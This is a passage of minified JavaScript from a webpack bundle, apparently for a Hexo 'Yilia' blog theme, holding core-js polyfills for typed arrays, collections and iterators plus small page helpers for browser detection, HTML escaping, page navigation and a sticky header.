TypeError("RegExp#exec called on incompatible receiver");return o.call(t,n)}},function(t,n,r){"use strict";var e=r(1),u=r(21),c=r(47),f=r(71);t.exports=function(t){e(e.S,t,{from:function(t){var n,r,e,i,o=arguments[1];return u(this),(n=void 0!==o)&&u(o),null==t?new this:(r=[],n?(e=0,i=c(o,arguments[2],2),f(t,!1,function(t){r.push(i(t,e++))})):f(t,!1,r.push,r),new this(r))}})}},function(t,n,r){"use strict";var e=r(1);t.exports=function(t){e(e.S,t,{of:function(){for(var t=arguments.length,n=new Array(t);t--;)n[t]=arguments[t];return new this(n)}})}},function(t,n,r){var f=r(49),a=r(51);t.exports=function(c){return function(t,n){var r,e,i=String(a(t)),o=f(n),u=i.length;return o<0||u<=o?c?"":void 0:(r=i.charCodeAt(o))<55296||56319<r||o+1===u||(e=i.charCodeAt(o+1))<56320||57343<e?c?i.charAt(o):r:c?i.slice(o,o+2):e-56320+(r-55296<<10)+65536}}},function(t,n,r){for(var e,i=r(3),o=r(26),u=r(79),c=u("typed_array"),f=u("view"),a=!(!i.ArrayBuffer||!i.DataView),s=a,l=0,h="Int8Array,Uint8Array,Uint8ClampedArray,Int16Array,Uint16Array,Int32Array,Uint32Array,Float32Array,Float64Array".split(",");l<9;)(e=i[h[l++]])?(o(e.prototype,c,!0),o(e.prototype,f,!0)):s=!1;t.exports={ABV:a,CONSTR:s,TYPED:c,VIEW:f}},function(t,n,r){var e=r(3).navigator;t.exports=e&&e.userAgent||""},function(t,n){"use strict";var r,e={versions:(r=window.navigator.userAgent,{trident:-1<r.indexOf("Trident"),presto:-1<r.indexOf("Presto"),webKit:-1<r.indexOf("AppleWebKit"),gecko:-1<r.indexOf("Gecko")&&-1==r.indexOf("KHTML"),mobile:!!r.match(/AppleWebKit.*Mobile.*/),ios:!!r.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/),android:-1<r.indexOf("Android")||-1<r.indexOf("Linux"),iPhone:-1<r.indexOf("iPhone")||-1<r.indexOf("Mac"),iPad:-1<r.indexOf("iPad"),webApp:-1==r.indexOf("Safari"),weixin:-1==r.indexOf("MicroMessenger")})};t.exports=e},function(t,n,r){"use strict";var e,i=r(87),l=(e=i)&&e.__esModule?e:{default:e},h=function(){function n(t,n,r){return n||r?String.fromCharCode(n||r):o[t]||t}function r(t){return s[t]}var e=/&quot;|&lt;|&gt;|&amp;|&nbsp;|&apos;|&#(\d+);|&#(\d+)/g,i=/['<> "&]/g,o={"&quot;":'"',"&lt;":"<","&gt;":">","&amp;":"&","&nbsp;":" "},u=/\u00a0/g,c=/<br\s*\/?>/gi,f=/\r?\n/g,a=/\s/g,s={};for(var t in o)s[o[t]]=t;return o["&apos;"]="'",s["'"]="&#39;",{encode:function(t){return t?(""+t).replace(i,r).replace(f,"<br/>").replace(a,"&nbsp;"):""},decode:function(t){return t?(""+t).replace(c,"\n").replace(e,n).replace(u," "):""},encodeBase16:function(t){if(!t)return t;for(var n=[],r=0,e=(t+="").length;r<e;r++)n.push(t.charCodeAt(r).toString(16).toUpperCase());return n.join("")},encodeBase16forJSON:function(t){if(!t)return t;for(var n=[],r=0,e=(t=t.replace(/[\u4E00-\u9FBF]/gi,function(t){return escape(t).replace("%u","\\u")})).length;r<e;r++)n.push(t.charCodeAt(r).toString(16).toUpperCase());return n.join("")},decodeBase16:function(t){if(!t)return t;for(var n=[],r=0,e=(t+="").length;r<e;r+=2)n.push(String.fromCharCode("0x"+t.slice(r,r+2)));return n.join("")},encodeObject:function(t){if(t instanceof Array)for(var n=0,r=t.length;n<r;n++)t[n]=h.encodeObject(t[n]);else if("object"==(void 0===t?"undefined":(0,l.default)(t)))for(var e in t)t[e]=h.encodeObject(t[e]);else if("string"==typeof t)return h.encode(t);return t},loadScript:function(t){var n=document.createElement("script");document.getElementsByTagName("body")[0].appendChild(n),n.setAttribute("src",t)},addLoadEvent:function(t){var n=window.onload;"function"!=typeof window.onload?window.onload=t:window.onload=function(){n(),t()}}}}();t.exports=h},function(t,n,r){"use strict";var e=r(131)(!0);t.exports=function(t,n,r){return n+(r?e(t,n).length:1)}},function(t,n,r){"use strict";var c=r(17),f=r(78),a=r(8);t.exports=function(t){for(var n=c(this),r=a(n.length),e=arguments.length,i=f(1<e?arguments[1]:void 0,r),o=2<e?arguments[2]:void 0,u=void 0===o?r:f(o,r);i<u;)n[i++]=t;return n}},function(t,n,r){var e=r(215);t.exports=function(t,n){return new(e(t))(n)}},function(t,n,r){"use strict";var e=r(11),i=r(75);t.exports=function(t,n,r){n in t?e.f(t,n,i(0,r)):t[n]=r}},function(t,n,r){var e=r(5),i=r(3).document,o=e(i)&&e(i.createElement);t.exports=function(t){return o?i.createElement(t):{}}},function(t,n){t.exports="constructor,hasOwnProperty,isPrototypeOf,propertyIsEnumerable,toLocaleString,toString,valueOf".split(",")},function(t,n,r){var e=r(7)("match");t.exports=function(n){var r=/./;try{"/./"[n](r)}catch(t){try{return r[e]=!1,!"/./"[n](r)}catch(n){}}return!0}},function(t,n,r){var e=r(3).document;t.exports=e&&e.documentElement},function(t,n,r){var o=r(5),u=r(153).set;t.exports=function(t,n,r){var e,i=n.constructor;return i!==r&&"function"==typeof i&&(e=i.prototype)!==r.prototype&&o(e)&&u&&u(t,e),t}},function(t,n,r){var e=r(82),i=r(7)("iterator"),o=Array.prototype;t.exports=function(t){return void 0!==t&&(e.Array===t||o[i]===t)}},function(t,n,r){"use strict";var e=r(72),i=r(75),o=r(83),u={};r(26)(u,r(7)("iterator"),function(){return this}),t.exports=function(t,n,r){t.prototype=e(u,{next:i(1,r)}),o(t,n+" Iterator")}},function(t,n,r){"use strict";var x=r(68),m=r(1),S=r(27),w=r(26),_=r(82),O=r(146),E=r(83),M=r(32),P=r(7)("iterator"),j=!([].keys&&"next"in[].keys()),F="values",A=function(){return this};t.exports=function(t,n,r,e,i,o,u){O(r,n,e);var c,f,a,s=function(t){if(!j&&t in p)return p[t];switch(t){case"keys":case F:return function(){return new r(this,t)}}return function(){return new r(this,t)}},l=n+" Iterator",h=i==F,v=!1,p=t.prototype,d=p[P]||p["@@iterator"]||i&&p[i],y=d||s(i),g=i?h?s("entries"):y:void 0,b="Array"==n&&p.entries||d;if(b&&((a=M(b.call(new t)))!==Object.prototype&&a.next&&(E(a,l,!0),x||"function"==typeof a[P]||w(a,P,A))),h&&d&&d.name!==F&&(v=!0,y=function(){return d.call(this)}),x&&!u||!j&&!v&&p[P]||w(p,P,y),_[n]=y,_[l]=A,i)if(c={values:h?y:s(F),keys:o?y:s("keys"),entries:g},u)for(f in c)f in p||S(p,f,c[f]);else m(m.P+m.F*(j||v),n,c);return c}},function(t,n){var r=Math.expm1;t.exports=!r||22025.465794806718<r(10)||r(10)<22025.465794806718||-2e-17!=r(-2e-17)?function(t){return 0==(t=+t)?t:-1e-6<t&&t<1e-6?t+t*t/2:Math.exp(t)-1}:r},function(t,n){t.exports=Math.sign||function(t){return 0==(t=+t)||t!=t?t:t<0?-1:1}},function(t,n,r){var c=r(3),f=r(158).set,a=c.MutationObserver||c.WebKitMutationObserver,s=c.process,l=c.Promise,h="process"==r(45)(s);t.exports=function(){var r,e,i,t=function(){var t,n;for(h&&(t=s.domain)&&t.exit();r;){n=r.fn,r=r.next;try{n()}catch(t){throw r?i():e=void 0,t}}e=void 0,t&&t.enter()};if(h)i=function(){s.nextTick(t)};else if(!a||c.navigator&&c.navigator.standalone)if(l&&l.resolve){var n=l.resolve(void 0);i=function(){n.then(t)}}else i=function(){f.call(c,t)};else{var o=!0,u=document.createTextNode("");new a(t).observe(u,{characterData:!0}),i=function(){u.data=o=!o}}return function(t){var n={fn:t,next:void 0};e&&(e.next=n),r||(r=n,i()),e=n}}},function(t,n,r){"use strict";function e(t){var r,e;this.promise=new t(function(t,n){if(void 0!==r||void 0!==e)throw TypeError("Bad Promise constructor");r=t,e=n}),this.resolve=i(r),this.reject=i(e)}var i=r(21);t.exports.f=function(t){return new e(t)}},function(t,n,r){"use strict";var e,i,u=r(115),c=RegExp.prototype.exec,f=String.prototype.replace,o=c,a="lastIndex",s=(e=/a/,i=/b*/g,c.call(e,"a"),c.call(i,"a"),0!==e[a]||0!==i[a]),l=void 0!==/()??/.exec("")[1];(s||l)&&(o=function(t){var n,r,e,i,o=this;return l&&(r=new RegExp("^"+o.source+"$(?!\\s)",u.call(o))),s&&(n=o[a]),e=c.call(o,t),s&&e&&(o[a]=o.global?e.index+e[0].length:n),l&&e&&1<e.length&&f.call(e[0],r,function(){for(i=1;i<arguments.length-2;i++)void 0===arguments[i]&&(e[i]=void 0)}),e}),t.exports=o},function(t,n,i){var r=i(5),e=i(2),o=function(t,n){if(e(t),!r(n)&&null!==n)throw TypeError(n+": can't set as prototype!")};t.exports={set:Object.setPrototypeOf||("__proto__"in{}?function(t,r,e){try{(e=i(47)(Function.call,i(31).f(Object.prototype,"__proto__").set,2))(t,[]),r=!(t instanceof Array)}catch(t){r=!0}return function(t,n){return o(t,n),r?t.__proto__=n:e(t,n),t}}({},!1):void 0),check:o}},function(t,n,r){var e=r(118)("keys"),i=r(79);t.exports=function(t){return e[t]||(e[t]=i(t))}},function(t,n,r){var e=r(124),i=r(51);t.exports=function(t,n,r){if(e(n))throw TypeError("String#"+r+" doesn't accept regex!");return String(i(t))}},function(t,n,r){"use strict";var i=r(49),o=r(51);t.exports=function(t){var n=String(o(this)),r="",e=i(t);if(e<0||e==1/0)throw RangeError("Count can't be negative");for(;0<e;(e>>>=1)&&(n+=n))1&e&&(r+=n);return r}},function(t,n){t.exports="\t\n\v\f\r   ᠎             　\u2028\u2029\ufeff"},function(t,n,r){var e,i,o,u=r(47),c=r(175),f=r(143),a=r(140),s=r(3),l=s.process,h=s.setImmediate,v=s.clearImmediate,p=s.MessageChannel,d=s.Dispatch,y=0,g={},b="onreadystatechange",x=function(){var t=+this;if(g.hasOwnProperty(t)){var n=g[t];delete g[t],n()}},m=function(t){x.call(t.data)};h&&v||(h=function(t){for(var n=[],r=1;arguments.length>r;)n.push(arguments[r++]);return g[++y]=function(){c("function"==typeof t?t:Function(t),n)},e(y),y},v=function(t){delete g[t]},"process"==r(45)(l)?e=function(t){l.nextTick(u(x,t,1))}:d&&d.now?e=function(t){d.now(u(x,t,1))}:p?(o=(i=new p).port2,i.port1.onmessage=m,e=u(o.postMessage,o,1)):s.addEventListener&&"function"==typeof postMessage&&!s.importScripts?(e=function(t){s.postMessage(t+"","*")},s.addEventListener("message",m,!1)):e=b in a("script")?function(t){f.appendChild(a("script"))[b]=function(){f.removeChild(this),x.call(t)}}:function(t){setTimeout(u(x,t,1),0)}),t.exports={set:h,clear:v}},function(t,n,r){"use strict";function e(t,n,r){var e,i,o,u=new Array(r),c=8*r-n-1,f=(1<<c)-1,a=f>>1,s=23===n?W(2,-24)-W(2,-77):0,l=0,h=t<0||0===t&&1/t<0?1:0;for((t=G(t))!=t||t===C?(i=t!=t?1:0,e=f):(e=U(V(t)/B),t*(o=W(2,-e))<1&&(e--,o*=2),2<=(t+=1<=e+a?s/o:s*W(2,1-a))*o&&(e++,o/=2),f<=e+a?(i=0,e=f):1<=e+a?(i=(t*o-1)*W(2,n),e+=a):(i=t*W(2,a-1)*W(2,n),e=0));8<=n;u[l++]=255&i,i/=256,n-=8);for(e=e<<n|i,c+=n;0<c;u[l++]=255&e,e/=256,c-=8);return u[--l]|=128*h,u}function i(t,n,r){var e,i=8*r-n-1,o=(1<<i)-1,u=o>>1,c=i-7,f=r-1,a=t[f--],s=127&a;for(a>>=7;0<c;s=256*s+t[f],f--,c-=8);for(e=s&(1<<-c)-1,s>>=-c,c+=n;0<c;e=256*e+t[f],f--,c-=8);if(0===s)s=1-u;else{if(s===o)return e?NaN:a?-C:C;e+=W(2,n),s-=u}return(a?-1:1)*e*W(2,s-n)}function o(t){return t[3]<<24|t[2]<<16|t[1]<<8|t[0]}function u(t){return[255&t]}function c(t){return[255&t,t>>8&255]}function f(t){return[255&t,t>>8&255,t>>16&255,t>>24&255]}function a(t){return e(t,52,8)}function s(t){return e(t,23,4)}function l(t,n,r){M(t[I],n,{get:function(){return this[r]}})}function h(t,n,r,e){var i=O(+r);if(i+n>t[H])throw R(L);var o=t[K]._b,u=i+t[J],c=o.slice(u,u+n);return e?c:c.reverse()}function v(t,n,r,e,i,o){var u=O(+r);if(u+n>t[H])throw R(L);for(var c=t[K]._b,f=u+t[J],a=e(+i),s=0;s<n;s++)c[f+s]=a[o?s:n-s-1]}var p=r(3),d=r(10),y=r(68),g=r(132),b=r(26),x=r(76),m=r(4),S=r(70),w=r(49),_=r(8),O=r(194),E=r(73).f,M=r(11).f,P=r(137),j=r(83),F="ArrayBuffer",A="DataView",I="prototype",L="Wrong index!",N=p[F],T=p[A],k=p.Math,R=p.RangeError,C=p.Infinity,D=N,G=k.abs,W=k.pow,U=k.floor,V=k.log,B=k.LN2,q="byteLength",z="byteOffset",K=d?"_b":"buffer",H=d?"_l":q,J=d?"_o":z;if(g.ABV){if(!m(function(){N(1)})||!m(function(){new N(-1)})||m(function(){return new N,new N(1.5),new N(NaN),N.name!=F})){for(var $,Y=(N=function(t){return S(this,N),new D(O(t))})[I]=D[I],X=E(D),Q=0;X.length>Q;)($=X[Q++])in N||b(N,$,D[$]);y||(Y.constructor=N)}var Z=new T(new N(2)),tt=T[I].setInt8;Z.setInt8(0,2147483648),Z.setInt8(1,2147483649),!Z.getInt8(0)&&Z.getInt8(1)||x(T[I],{setInt8:function(t,n){tt.call(this,t,n<<24>>24)},setUint8:function(t,n){tt.call(this,t,n<<24>>24)}},!0)}else N=function(t){S(this,N,F);var n=O(t);this._b=P.call(new Array(n),0),this[H]=n},T=function(t,n,r){S(this,T,A),S(t,N,A);var e=t[H],i=w(n);if(i<0||e<i)throw R("Wrong offset!");if(e<i+(r=void 0===r?e-i:_(r)))throw R("Wrong length!");this[K]=t,this[J]=i,this[H]=r},d&&(l(N,q,"_l"),l(T,"buffer","_b"),l(T,q,"_l"),l(T,z,"_o")),x(T[I],{getInt8:function(t){return h(this,1,t)[0]<<24>>24},getUint8:function(t){return h(this,1,t)[0]},getInt16:function(t){var n=h(this,2,t,arguments[1]);return(n[1]<<8|n[0])<<16>>16},getUint16:function(t){var n=h(this,2,t,arguments[1]);return n[1]<<8|n[0]},getInt32:function(t){return o(h(this,4,t,arguments[1]))},getUint32:function(t){return o(h(this,4,t,arguments[1]))>>>0},getFloat32:function(t){return i(h(this,4,t,arguments[1]),23,4)},getFloat64:function(t){return i(h(this,8,t,arguments[1]),52,8)},setInt8:function(t,n){v(this,1,t,u,n)},setUint8:function(t,n){v(this,1,t,u,n)},setInt16:function(t,n){v(this,2,t,c,n,arguments[2])},setUint16:function(t,n){v(this,2,t,c,n,arguments[2])},setInt32:function(t,n){v(this,4,t,f,n,arguments[2])},setUint32:function(t,n){v(this,4,t,f,n,arguments[2])},setFloat32:function(t,n){v(this,4,t,s,n,arguments[2])},setFloat64:function(t,n){v(this,8,t,a,n,arguments[2])}});j(N,F),j(T,A),b(T[I],g.VIEW,!0),n[F]=N,n[A]=T},function(t,n,r){var e=r(3),i=r(46),o=r(68),u=r(195),c=r(11).f;t.exports=function(t){var n=i.Symbol||(i.Symbol=o?{}:e.Symbol||{});"_"==t.charAt(0)||t in n||c(n,t,{value:u.f(t)})}},function(t,n,r){var e=r(81),i=r(7)("iterator"),o=r(82);t.exports=r(46).getIteratorMethod=function(t){if(null!=t)return t[i]||t["@@iterator"]||o[e(t)]}},function(t,n,r){"use strict";var e=r(67),i=r(178),o=r(82),u=r(33);t.exports=r(147)(Array,"Array",function(t,n){this._t=u(t),this._i=0,this._k=n},function(){var t=this._t,n=this._k,r=this._i++;return!t||r>=t.length?(this._t=void 0,i(1)):i(0,"keys"==n?r:"values"==n?t[r]:[r,t[r]])},"values"),o.Arguments=o.Array,e("keys"),e("values"),e("entries")},function(t,n){t.exports=function(t,n){t.classList?t.classList.add(n):t.className+=" "+n}},function(t,n){t.exports=function(t,n){if(t.classList)t.classList.remove(n);else{var r=new RegExp("(^|\\b)"+n.split(" ").join("|")+"(\\b|$)","gi");t.className=t.className.replace(r," ")}}},function(t,n,r){var e=r(45);t.exports=function(t,n){if("number"!=typeof t&&"Number"!=e(t))throw TypeError(n);return+t}},function(t,n,r){"use strict";var a=r(17),s=r(78),l=r(8);t.exports=[].copyWithin||function(t,n){var r=a(this),e=l(r.length),i=s(t,e),o=s(n,e),u=2<arguments.length?arguments[2]:void 0,c=Math.min((void 0===u?e:s(u,e))-o,e-i),f=1;for(o<i&&i<o+c&&(f=-1,o+=c-1,i+=c-1);0<c--;)o in r?r[i]=r[o]:delete r[i],i+=f,o+=f;return r}},function(t,n,r){var e=r(71);t.exports=function(t,n){var r=[];return e(t,!1,r.push,r,n),r}},function(t,n,r){var s=r(21),l=r(17),h=r(116),v=r(8);t.exports=function(t,n,r,e,i){s(n);var o=l(t),u=h(o),c=v(o.length),f=i?c-1:0,a=i?-1:1;if(r<2)for(;;){if(f in u){e=u[f],f+=a;break}if(f+=a,i?f<0:c<=f)throw TypeError("Reduce of empty array with no initial value")}for(;i?0<=f:f<c;f+=a)f in u&&(e=n(e,u[f],f,o));return e}},function(t,n,r){"use strict";var o=r(21),u=r(5),c=r(175),f=[].slice,a={};t.exports=Function.bind||function(n){var r=o(this),e=f.call(arguments,1),i=function(){var t=e.concat(f.call(arguments));return this instanceof i?function(t,n,r){if(!(n in a)){for(var e=[],i=0;i<n;i++)e[i]="a["+i+"]";a[n]=Function("F,a","return new F("+e.join(",")+")")}return a[n](t,r)}(r,t.length,t):c(r,t,n)};return u(r.prototype)&&(i.prototype=r.prototype),i}},function(t,n,r){"use strict";var u=r(11).f,c=r(72),f=r(76),a=r(47),s=r(70),l=r(71),e=r(147),i=r(178),o=r(77),h=r(10),v=r(69).fastKey,p=r(80),d=h?"_s":"size",y=function(t,n){var r,e=v(n);if("F"!==e)return t._i[e];for(r=t._f;r;r=r.n)if(r.k==n)return r};t.exports={getConstructor:function(t,o,r,e){var i=t(function(t,n){s(t,i,o,"_i"),t._t=o,t._i=c(null),t._f=void 0,t._l=void 0,t[d]=0,null!=n&&l(n,r,t[e],t)});return f(i.prototype,{clear:function(){for(var t=p(this,o),n=t._i,r=t._f;r;r=r.n)r.r=!0,r.p&&(r.p=r.p.n=void 0),delete n[r.i];t._f=t._l=void 0,t[d]=0},delete:function(t){var n=p(this,o),r=y(n,t);if(r){var e=r.n,i=r.p;delete n._i[r.i],r.r=!0,i&&(i.n=e),e&&(e.p=i),n._f==r&&(n._f=e),n._l==r&&(n._l=i),n[d]--}return!!r},forEach:function(t){p(this,o);for(var n,r=a(t,1<arguments.length?arguments[1]:void 0,3);n=n?n.n:this._f;)for(r(n.v,n.k,this);n&&n.r;)n=n.p},has:function(t){return!!y(p(this,o),t)}}),h&&u(i.prototype,"size",{get:function(){return p(this,o)[d]}}),i},def:function(t,n,r){var e,i,o=y(t,n);return o?o.v=r:(t._l=o={i:i=v(n,!0),k:n,v:r,p:e=t._l,n:void 0,r:!1},t._f||(t._f=o),e&&(e.n=o),t[d]++,"F"!==i&&(t._i[i]=o)),t},getEntry:y,setStrong:function(t,r,n){e(t,r,function(t,n){this._t=p(t,r),this._k=n,this._l=void 0},function(){for(var t=this,n=t._k,r=t._l;r&&r.r;)r=r.p;return t._t&&(t._l=r=r?r.n:t._t._f)?i(0,"keys"==n?r.k:"values"==n?r.v:[r.k,r.v]):(t._t=void 0,i(1))},n?"entries":"values",!n,!0),o(r)}}},function(t,n,r){var e=r(81),i=r(167);t.exports=function(t){return function(){if(e(this)!=t)throw TypeError(t+"#toJSON isn't generic");return i(this)}}},function(t,n,r){"use strict";var u=r(76),c=r(69).getWeak,i=r(2),f=r(5),a=r(70),s=r(71),e=r(50),l=r(30),h=r(80),o=e(5),v=e(6),p=0,d=function(t){return t._l||(t._l=new y)},y=function(){this.a=[]},g=function(t,n){return o(t.a,function(t){return t[0]===n})};y.prototype={get:function(t){var n=g(this,t);if(n)return n[1]},has:function(t){return!!g(this,t)},set:function(t,n){var r=g(this,t);r?r[1]=n:this.a.push([t,n])},delete:function(n){var t=v(this.a,function(t){return t[0]===n});return~t&&this.a.splice(t,1),!!~t}},t.exports={getConstructor:function(t,r,e,i){var o=t(function(t,n){a(t,o,r,"_i"),t._t=r,t._i=p++,t._l=void 0,null!=n&&s(n,e,t[i],t)});return u(o.prototype,{delete:function(t){if(!f(t))return!1;var n=c(t);return!0===n?d(h(this,r)).delete(t):n&&l(n,this._i)&&delete n[this._i]},has:function(t){if(!f(t))return!1;var n=c(t);return!0===n?d(h(this,r)).has(t):n&&l(n,this._i)}}),o},def:function(t,n,r){var e=c(i(n),!0);return!0===e?d(t).set(n,r):e[t._i]=r,t},ufstore:d}},function(t,n,r){"use strict";var p=r(123),d=r(5),y=r(8),g=r(47),b=r(7)("isConcatSpreadable");t.exports=function t(n,r,e,i,o,u,c,f){for(var a,s,l=o,h=0,v=!!c&&g(c,f,3);h<i;){if(h in e){if(a=v?v(e[h],h,r):e[h],s=!1,d(a)&&(s=void 0!==(s=a[b])?!!s:p(a)),s&&0<u)l=t(n,r,a,y(a.length),l,u-1)-1;else{if(9007199254740991<=l)throw TypeError();n[l]=a}l++}h++}return l}},function(t,n,r){t.exports=!r(10)&&!r(4)(function(){return 7!=Object.defineProperty(r(140)("div"),"a",{get:function(){return 7}}).a})},function(t,n){t.exports=function(t,n,r){var e=void 0===r;switch(n.length){case 0:return e?t():t.call(r);case 1:return e?t(n[0]):t.call(r,n[0]);case 2:return e?t(n[0],n[1]):t.call(r,n[0],n[1]);case 3:return e?t(n[0],n[1],n[2]):t.call(r,n[0],n[1],n[2]);case 4:return e?t(n[0],n[1],n[2],n[3]):t.call(r,n[0],n[1],n[2],n[3])}return t.apply(r,n)}},function(t,n,r){var e=r(5),i=Math.floor;t.exports=function(t){return!e(t)&&isFinite(t)&&i(t)===t}},function(t,n,r){var o=r(2);t.exports=function(t,n,r,e){try{return e?n(o(r)[0],r[1]):n(r)}catch(n){var i=t.return;throw void 0!==i&&o(i.call(t)),n}}},function(t,n){t.exports=function(t,n){return{value:n,done:!!t}}},function(t,n,r){var o=r(149),e=Math.pow,u=e(2,-52),c=e(2,-23),f=e(2,127)*(2-c),a=e(2,-126);t.exports=Math.fround||function(t){var n,r,e=Math.abs(t),i=o(t);return e<a?i*(e/a/c+1/u-1/u)*a*c:f<(r=(n=(1+c/u)*e)-(n-e))||r!=r?i*(1/0):i*r}},function(t,n){t.exports=Math.log1p||function(t){return-1e-8<(t=+t)&&t<1e-8?t-t*t/2:Math.log(1+t)}},function(t,n){t.exports=Math.scale||function(t,n,r,e,i){return 0===arguments.length||t!=t||n!=n||r!=r||e!=e||i!=i?NaN:t===1/0||t===-1/0?t:(t-n)*(i-e)/(r-n)+e}},function(t,n,r){"use strict";var h=r(10),v=r(74),p=r(127),d=r(117),y=r(17),g=r(116),i=Object.assign;t.exports=!i||r(4)(function(){var t={},n={},r=Symbol(),e="abcdefghijklmnopqrst";return t[r]=7,e.split("").forEach(function(t){n[t]=t}),7!=i({},t)[r]||Object.keys(i({},n)).join("")!=e})?function(t,n){for(var r=y(t),e=arguments.length,i=1,o=p.f,u=d.f;i<e;)for(var c,f=g(arguments[i++]),a=o?v(f).concat(o(f)):v(f),s=a.length,l=0;l<s;)c=a[l++],h&&!u.call(f,c)||(r[c]=f[c]);return r}:i},function(t,n,r){var u=r(11),c=r(2),f=r(74);t.exports=r(10)?Object.defineProperties:function(t,n){c(t);for(var r,e=f(n),i=e.length,o=0;o<i;)u.f(t,r=e[o++],n[r]);return t}},function(t,n,r){var e=r(33),i=r(73).f,o={}.toString,u="object"==typeof window&&window&&Object.getOwnPropertyNames?Object.getOwnPropertyNames(window):[];t.exports.f=function(t){return u&&"[object Window]"==o.call(t)?function(t){try{return i(t)}catch(t){return u.slice()}}(t):i(e(t))}},function(t,n,r){var u=r(30),c=r(33),f=r(120)(!1),a=r(154)("IE_PROTO");t.exports=function(t,n){var r,e=c(t),i=0,o=[];for(r in e)r!=a&&u(e,r)&&o.push(r);for(;n.length>i;)u(e,r=n[i++])&&(~f(o,r)||o.push(r));return o}},function(t,n,r){var f=r(10),a=r(74),s=r(33),l=r(117).f;t.exports=function(c){return function(t){for(var n,r=s(t),e=a(r),i=e.length,o=0,u=[];o<i;)n=e[o++],f&&!l.call(r,n)||u.push(c?[n,r[n]]:r[n]);return u}}},function(t,n,r){var e=r(73),i=r(127),o=r(2),u=r(3).Reflect;t.exports=u&&u.ownKeys||function(t){var n=e.f(o(t)),r=i.f;return r?n.concat(r(t)):n}},function(t,n,r){var e=r(3).parseFloat,i=r(84).trim;t.exports=1/e(r(157)+"-0")!=-1/0?function(t){var n=i(String(t),3),r=e(n);return 0===r&&"-"==n.charAt(0)?-0:r}:e},function(t,n,r){var e=r(3).parseInt,i=r(84).trim,o=r(157),u=/^[-+]?0[xX]/;t.exports=8!==e(o+"08")||22!==e(o+"0x16")?function(t,n){var r=i(String(t),3);return e(r,n>>>0||(u.test(r)?16:10))}:e},function(t,n){t.exports=function(t){try{return{e:!1,v:t()}}catch(t){return{e:!0,v:t}}}},function(t,n,r){var e=r(2),i=r(5),o=r(151);t.exports=function(t,n){if(e(t),i(n)&&n.constructor===t)return n;var r=o.f(t);return(0,r.resolve)(n),r.promise}},function(t,n){t.exports=Object.is||function(t,n){return t===n?0!==t||1/t==1/n:t!=t&&n!=n}},function(t,n,r){var s=r(8),l=r(156),h=r(51);t.exports=function(t,n,r,e){var i=String(h(t)),o=i.length,u=void 0===r?" ":String(r),c=s(n);if(c<=o||""==u)return i;var f=c-o,a=l.call(u,Math.ceil(f/u.length));return a.length>f&&(a=a.slice(0,f)),e?a+i:i+a}},function(t,n,r){var e=r(49),i=r(8);t.exports=function(t){if(void 0===t)return 0;var n=e(t),r=i(n);if(n!==r)throw RangeError("Wrong length!");return r}},function(t,n,r){n.f=r(7)},function(t,n,r){"use strict";var e=r(170),i=r(80);t.exports=r(121)("Map",function(t){return function(){return t(this,0<arguments.length?arguments[0]:void 0)}},{get:function(t){var n=e.getEntry(i(this,"Map"),t);return n&&n.v},set:function(t,n){return e.def(i(this,"Map"),0===t?0:t,n)}},e,!0)},function(t,n,r){"use strict";var e=r(152);r(1)({target:"RegExp",proto:!0,forced:e!==/./.exec},{exec:e})},function(t,n,r){r(10)&&"g"!=/./g.flags&&r(11).f(RegExp.prototype,"flags",{configurable:!0,get:r(115)})},function(t,n,r){"use strict";var e=r(170),i=r(80);t.exports=r(121)("Set",function(t){return function(){return t(this,0<arguments.length?arguments[0]:void 0)}},{add:function(t){return e.def(i(this,"Set"),t=0===t?0:t,t)}},e)},function(t,n,r){"use strict";var o,e=r(3),i=r(50)(0),u=r(27),c=r(69),f=r(182),a=r(172),s=r(5),l=r(80),h=r(80),v=!e.ActiveXObject&&"ActiveXObject"in e,p="WeakMap",d=c.getWeak,y=Object.isExtensible,g=a.ufstore,b=function(t){return function(){return t(this,0<arguments.length?arguments[0]:void 0)}},x={get:function(t){if(s(t)){var n=d(t);return!0===n?g(l(this,p)).get(t):n?n[this._i]:void 0}},set:function(t,n){return a.def(l(this,p),t,n)}},m=t.exports=r(121)(p,b,x,a,!0,!0);h&&v&&(f((o=a.getConstructor(b,p)).prototype,x),c.NEED=!0,i(["delete","has","get","set"],function(e){var t=m.prototype,i=t[e];u(t,e,function(t,n){if(!s(t)||y(t))return i.call(this,t,n);this._f||(this._f=new o);var r=this._f[e](t,n);return"set"==e?this:r})}))},,,,function(t,n){"use strict";t.exports={init:function(){var t=document.querySelector("#page-nav");t&&!document.querySelector("#page-nav .extend.prev")&&(t.innerHTML='<a class="extend prev disabled" rel="prev"> Prev</a>'+t.innerHTML),t&&!document.querySelector("#page-nav .extend.next")&&(t.innerHTML=t.innerHTML+'<a class="extend next disabled" rel="next">Next </a>'),yiliaConfig&&yiliaConfig.open_in_new&&document.querySelectorAll(".article-entry a:not(.article-more-a)").forEach(function(t){var n=t.getAttribute("target");n&&""!==n||t.setAttribute("target","_blank")}),yiliaConfig&&yiliaConfig.toc_hide_index&&document.querySelectorAll(".toc-number").forEach(function(t){t.style.display="none"})}}},function(t,n,r){"use strict";function e(t){return t&&t.__esModule?t:{default:t}}function i(t,n,r,e,i){var o=function(t){for(var n=t.offsetLeft,r=t.offsetParent;null!==r;)n+=r.offsetLeft,r=r.offsetParent;return n}(t),u=function(t){for(var n=t.offsetTop,r=t.offsetParent;null!==r;)n+=r.offsetTop,r=r.offsetParent;return n}(t)-n;if(u-r<=i){var c=t.$newDom;c||(c=t.cloneNode(!0),(0,a.default)(t,c),(t.$newDom=c).style.position="fixed",c.style.top=(r||u)+"px",c.style.left=o+"px",c.style.zIndex=e||2,c.style.width="100%",c.style.color="#fff"),c.style.visibility="visible",t.style.visibility="hidden"}else{t.style.visibility="visible";var f=t.$newDom;f&&(f.style.visibility="hidden")}}function o(){var t=document.querySelector(".js-overlay"),n=document.querySelector(".js-header-menu");i(t,document.body.scrollTop,-63,2,0),i(n,document.body.scrollTop,1,3,0)}var f=e(r(163)),a=e((e(r(164)),r(414))),u=e(r(134)),c=e(r(204)),s=r(135);u.default.versions.mobile&&window.screen.width<800&&(function(){for(var t=document.querySelectorAll(".js-header-menu li a"),n=window.location.pathname,r=0,e=t.length;r<e;r++){var i=t[r];o=n,u=i.getAttribute("href"),c=/\/|index.html/g,o.replace(c,"")===u.replace(c,"")&&(0,f.default)(i,"active")}var o,u,c}(),document.querySelector("#container").addEventListener("scroll",function(t){o()}),window.addEventListener("scroll",function(t){o()}),o()),(0,s.addLoadEvent)(function(){c.default.init()}),t.exports={}},,,function(t,n,r){(function(t){"use strict";function 